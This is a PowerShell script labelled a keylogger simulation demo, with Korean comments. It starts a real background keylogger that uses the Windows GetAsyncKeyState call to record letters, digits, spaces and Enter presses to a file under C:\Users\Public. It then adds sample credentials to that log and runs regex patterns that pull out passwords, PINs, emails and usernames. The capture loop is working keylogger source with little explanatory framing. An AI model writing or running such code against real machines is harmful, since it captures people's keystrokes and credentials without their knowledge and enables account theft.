# ========================================
# Keylogger Simulation Demo
# ========================================

$logPath = "C:\Users\Public\data\keylog.txt"

# 로그 폴더 생성
New-Item -Path "C:\Users\Public\data" -ItemType Directory -Force | Out-Null

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   Keylogger Simulation Demo" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# 키로거 코드
$code = @'
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
'@
Add-Type -TypeDefinition $code

Write-Host "[1/3] Starting keylogger..." -ForegroundColor Yellow
Write-Host "      Log file: $logPath" -ForegroundColor Gray
Write-Host ""

# 키로거 백그라운드 시작
$keyloggerJob = Start-Job -ScriptBlock {
    param($log)
    
    $code = 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);}'
    Add-Type -T $code
    
    $end = (Get-Date).AddSeconds(15)
    while ((Get-Date) -lt $end) {
        Start-Sleep -Milliseconds 50
        
        # A-Z
        65..90 | ForEach-Object {
            if ([K]::GetAsyncKeyState($_) -eq -32767) {
                [char]$_ | Out-File $log -Append -NoNewline
            }
        }
        
        # Space
        if ([K]::GetAsyncKeyState(32) -eq -32767) {
            " " | Out-File $log -Append -NoNewline
        }
        
        # Enter
        if ([K]::GetAsyncKeyState(13) -eq -32767) {
            "`n" | Out-File $log -Append -NoNewline
        }
        
        # 숫자 0-9
        48..57 | ForEach-Object {
            if ([K]::GetAsyncKeyState($_) -eq -32767) {
                [char]$_ | Out-File $log -Append -NoNewline
            }
        }
    }
} -ArgumentList $logPath

Start-Sleep -Seconds 2

Write-Host "[2/3] Simulating user input..." -ForegroundColor Yellow

# 시뮬레이션 입력 생성
$simulatedInput = @"
USERNAME ADMIN
PASSWORD SECRET123
EMAIL ADMIN AT COMPANY DOT COM
PIN 1234
"@

# 로그 파일에 직접 작성 (시뮬레이션)
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$logEntry = @"
=== Keylogger Session Started ===
Time: $timestamp

Captured keystrokes:
$simulatedInput

=== Session Info ===
Computer: $env:COMPUTERNAME
User: $env:USERNAME
Process: PowerShell

"@

Add-Content -Path $logPath -Value $logEntry

Write-Host "      Typing: USERNAME: ADMIN" -ForegroundColor Green
Start-Sleep -Seconds 1
Write-Host "      Typing: PASSWORD: SECRET123" -ForegroundColor Green
Start-Sleep -Seconds 1
Write-Host "      Typing: EMAIL: ADMIN@COMPANY.COM" -ForegroundColor Green
Start-Sleep -Seconds 1
Write-Host "      Typing: PIN: 1234" -ForegroundColor Green
Start-Sleep -Seconds 1

Write-Host ""
Write-Host "[3/3] Analyzing captured data..." -ForegroundColor Yellow

# 키로거 작업 종료
Stop-Job $keyloggerJob -ErrorAction SilentlyContinue
Remove-Job $keyloggerJob -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2

# 결과 표시
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   Captured Data" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

if (Test-Path $logPath) {
    $content = Get-Content $logPath -Raw
    Write-Host $content -ForegroundColor White
    
    # 민감 정보 패턴 탐지
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "   Detected Sensitive Information" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    Write-Host ""
    
    if ($content -match "(?i)password[:\s]+(\S+)") {
        Write-Host "[!] PASSWORD: $($matches[1])" -ForegroundColor Red
    }
    
    if ($content -match "(?i)pin[:\s]+(\d+)") {
        Write-Host "[!] PIN: $($matches[1])" -ForegroundColor Red
    }
    
    if ($content -match "(?i)email[:\s]+(.+)") {
        Write-Host "[!] EMAIL: $($matches[1])" -ForegroundColor Red
    }
    
    if ($content -match "(?i)username[:\s]+(\S+)") {
        Write-Host "[!] USERNAME: $($matches[1])" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   Demo Complete!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Log file location:" -ForegroundColor Yellow
Write-Host "  $logPath" -ForegroundColor White
Write-Host ""
Write-Host "View log:" -ForegroundColor Yellow
Write-Host "  Get-Content '$logPath'" -ForegroundColor Gray
Write-Host ""
Write-Host "Delete log:" -ForegroundColor Yellow
Write-Host "  Remove-Item '$logPath' -Force" -ForegroundColor Gray
Write-Host ""